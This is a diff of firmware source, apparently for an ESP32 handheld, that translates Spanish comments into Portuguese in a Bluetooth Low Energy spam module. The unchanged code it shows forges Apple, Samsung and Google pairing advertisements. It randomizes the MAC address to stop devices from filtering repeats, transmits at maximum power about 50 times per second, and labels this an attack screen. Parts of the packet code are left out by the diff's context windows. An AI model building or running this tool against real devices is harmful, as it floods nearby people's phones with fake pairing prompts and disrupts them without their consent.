@@ -31,7 +31,7 @@ static const char* MODE_NAMES[] = {
 static const int MODE_COUNT = 5;
 
 // ═══════════════════════════════════════════════════════════════════════════
-//  APPLE CONTINUITY · modelos de producto y sus nombres legibles
+//  APPLE CONTINUITY · modelos de produto e seus nomes legíveis
 //  Format: sub-type 0x07 (pairing) + length + flags + product_id (2B) + etc
 // ═══════════════════════════════════════════════════════════════════════════
 struct AppleModel {
@@ -113,19 +113,19 @@ static String  currentDeviceName = "";
 static SpamMode activeMode = SPAM_APPLE;
 
 // ═══════════════════════════════════════════════════════════════════════════
-//  GENERACIÓN DE MAC ALEATORIA (evita que los dispositivos "recuerden" la MAC
-//  y filtren los advertisements repetidos)
+//  GERAÇÃO DE MAC ALEATÓRIA (evita que os dispositivos "lembrem" a MAC
+//  e filtrem os advertisements repetidos)
 // ═══════════════════════════════════════════════════════════════════════════
 static void randomizeMac() {
     esp_bd_addr_t mac;
     for (int i = 0; i < 6; i++) mac[i] = (uint8_t)random(0, 256);
-    // Los 2 bits superiores del primer byte marcan tipo Random Static
+    // Os 2 bits superiores do primeiro byte marcam tipo Random Static
     mac[0] |= 0xC0;
     esp_ble_gap_set_rand_addr(mac);
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
-//  EMISIÓN DE UN PAQUETE (genera advertisement según el modo)
+//  EMISSÃO DE UM PACOTE (gera o advertisement conforme o modo)
 // ═══════════════════════════════════════════════════════════════════════════
 static void sendApplePacket(BLEAdvertising* adv) {
     int idx = random(0, APPLE_COUNT);
@@ -142,7 +142,7 @@ static void sendApplePacket(BLEAdvertising* adv) {
         m.product[0], m.product[1],
         0x55
     };
-    // Rellenar con random
+    // Preenche com random
     for (int i = 10; i < 31; i++) packet[i] = (uint8_t)random(0, 256);
 
     BLEAdvertisementData advData;
@@ -155,7 +155,7 @@ static void sendSamsungPacket(BLEAdvertising* adv) {
     const SamsungModel& m = SAMSUNG_MODELS[idx];
     currentDeviceName = String(m.name);
 
-    // Samsung Easy Setup packet (simplificado, funcional con One UI)
+    // Samsung Easy Setup packet (simplificado, funcional com One UI)
     uint8_t packet[27] = {
         0x1B, 0xFF,             // len, type=Mfg Data
         0x75, 0x00,             // Samsung vendor ID
@@ -217,7 +217,7 @@ static void sendGooglePacket(BLEAdvertising* adv) {
     adv->setAdvertisementData(advData);
 }
 
-// Dispatcher que emite un paquete según el modo (para CHAOS rota aleatorio)
+// Dispatcher que emite um pacote conforme o modo (para CHAOS gira aleatório)
 static void sendSpamPacket(BLEAdvertising* adv, SpamMode mode) {
     SpamMode effective = mode;
     if (mode == SPAM_CHAOS) {
@@ -267,7 +267,7 @@ static bool showDisclaimer() {
     tft.drawFastHLine(0, 210, 320, UI_MAIN);
     drawStringCustom(10, 218,   "OK: ACCEPT   UP or DOWN: CANCEL",      UI_ACCENT, 1);
 
-    // Esperar respuesta
+    // Espera a resposta
     while (true) {
         if (digitalRead(BTN_OK) == LOW) {
             beep(2200, 60);
@@ -287,7 +287,7 @@ static bool showDisclaimer() {
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
-//  MENÚ DE SELECCIÓN DE MODO
+//  MENU DE SELEÇÃO DE MODO
 // ═══════════════════════════════════════════════════════════════════════════
 static void drawModeMenu(int cursor) {
     tft.fillScreen(TFT_BLACK);
@@ -317,7 +317,7 @@ static void drawModeMenu(int cursor) {
     drawStringCustom(10, 222, "UP/DN:NAV   OK:START", UI_ACCENT, 1);
 }
 
-// Devuelve -1 si el usuario cancela; si no, el modo elegido (0..4)
+// Retorna -1 se o usuário cancela; senão, o modo escolhido (0..4)
 static int selectMode() {
     int cursor = 0;
     drawModeMenu(cursor);
@@ -347,14 +347,14 @@ static int selectMode() {
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
-//  PANTALLA DE ATAQUE ACTIVO
+//  TELA DE ATAQUE ATIVO
 // ═══════════════════════════════════════════════════════════════════════════
 static void drawAttackFrame(SpamMode mode) {
     tft.fillScreen(TFT_BLACK);
     tft.drawRect(0, 0, 320, 240, UI_SELECT);   // borde naranja = activo
     tft.drawRect(1, 1, 318, 238, UI_SELECT);
 
-    // Header con título del modo
+    // Header com o título do modo
     String title = "SPAM: ";
     switch (mode) {
         case SPAM_APPLE:     title += "APPLE";       break;
@@ -379,7 +379,7 @@ static void drawAttackFrame(SpamMode mode) {
 }
 
 static void drawAttackStats(unsigned long pkts, float rate) {
-    // Limpiar valores anteriores
+    // Limpa os valores anteriores
     tft.fillRect(130, 65, 185, 14, TFT_BLACK);
     tft.fillRect(130, 95, 185, 14, TFT_BLACK);
     tft.fillRect(130, 125, 185, 14, TFT_BLACK);
@@ -397,7 +397,7 @@ static void drawAttackStats(unsigned long pkts, float rate) {
     snprintf(rateBuf, sizeof(rateBuf), "%d pkt/sec", (int)rate);
     drawStringCustom(130, 130, rateBuf, TFT_CYAN, 1);
 
-    // Barra de animación de actividad
+    // Barra de animação de atividade
     tft.fillRect(10, 160, 300, 14, TFT_BLACK);
     tft.drawRect(10, 160, 300, 14, UI_ACCENT);
     int fillW = 10 + (int)(random(50, 290));
@@ -409,34 +409,34 @@ static void drawAttackStats(unsigned long pkts, float rate) {
 // ═══════════════════════════════════════════════════════════════════════════
 void runBLESpam() {
 
-    // Esperar liberación de OK
+    // Espera a liberação do OK
     while (digitalRead(BTN_OK) == LOW) delay(5);
     delay(100);
 
     // Disclaimer
     if (!showDisclaimer()) {
-        // Usuario canceló
+        // Usuário cancelou
         return;
     }
 
-    // Loop de menú (se puede entrar/salir de varios modos sin reiniciar BLE)
+    // Loop de menu (dá para entrar/sair de vários modos sem reiniciar o BLE)
     while (true) {
         int choice = selectMode();
         if (choice < 0) break;   // BACK
 
         activeMode = (SpamMode)choice;
 
-        // ── Inicializar BLE para TX ────────────────────────────────────
+        // ── Inicializa o BLE para TX ────────────────────────────────────
         BLEDevice::init("");
         esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
         BLEServer*      server = BLEDevice::createServer();
         BLEAdvertising* adv    = server->getAdvertising();
 
-        // Parámetros de advertising
+        // Parâmetros de advertising
         adv->setMinInterval(0x20);   // 20 ms
         adv->setMaxInterval(0x40);   // 40 ms
 
-        // ── Pantalla de ataque ──────────────────────────────────────────
+        // ── Tela de ataque ──────────────────────────────────────────
         drawAttackFrame(activeMode);
         beep(2400, 40); delay(20);
         beep(3000, 60);
@@ -453,7 +453,7 @@ void runBLESpam() {
         bool okHeld = false;
 
         while (!stopAttack) {
-            // Emitir paquete cada ~20 ms (≈50 pkt/sec)
+            // Emite um pacote a cada ~20 ms (≈50 pkt/sec)
             if (millis() - lastPacket > 20) {
                 adv->stop();
                 sendSpamPacket(adv, activeMode);
@@ -494,12 +494,12 @@ void runBLESpam() {
         beep(1800, 40); delay(20);
         beep(1200, 60);
 
-        // Esperar liberación OK
+        // Espera a liberação do OK
         while (digitalRead(BTN_OK) == LOW) delay(5);
         delay(150);
 
-        // Volver al menú de selección de modo (loop)
+        // Volta ao menu de seleção de modo (loop)
     }
 
-    // Sale al submenú padre
+    // Sai para o submenu pai
 }
